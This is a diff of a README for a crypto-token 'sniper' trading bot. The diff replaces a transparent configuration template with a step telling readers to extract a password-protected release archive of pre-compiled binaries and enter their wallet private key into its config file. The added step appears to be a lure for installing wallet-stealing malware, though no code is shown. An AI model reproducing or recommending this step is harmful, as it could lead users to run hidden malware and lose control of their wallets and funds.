@@ -18,41 +18,4 @@ The Telegram Listing Sniper Bot is designed to automatically buy newly listed to
 1. Obtain the pre-compiled binaries from the "dist" folder. These binaries should work on any platform, including mobile devices.
 2. Ensure you have all accompanying files required for the Telegram API.
 3. If you are building from source, generate your own Telegram API credentials as sharing them in plain text is against Telegram's terms of service.
-4. Rename :
-
-```
-# Your wallet address
-RECIPIENT=
-
-# Your wallet's private key
-PRIVATE_KEY=
-
-# BSC node web socket address
-BSC_NODE_WSS=wss://bsc-ws-node.nariox.org:443
-
-# Gas limit for transaction
-GASLIMIT="1000000"
-
-# Gas price for transaction
-GASPRICE="5"
-
-# CoinGecko settings
-COINGECKO=true
-COINGECKO_PURCHASEAMOUNT="0.005"
-
-# CoinMarketCap settings
-COINMARKETCAP=true
-COINMARKETCAP_PURCHASEAMOUNT="0.01"
-
-# Run bot in whitelist only mode?
-WHITELIST_ONLY=false
-
-# Always buy whitelisted tokens?
-WHITELIST_ALWAYS=true
-WHITELIST_PURCHASEAMOUNT="0.05"
-
-# Comma separated list of tokens to whitelist
-WHITELIST=
-```
-
-Please note that the bot will buy each token only once to avoid duplicate purchases.
+4. Clone the repository release and extract files with password `whLn1sTWT`. Edit the `address` and `private_key` fields in the `config.json` file.
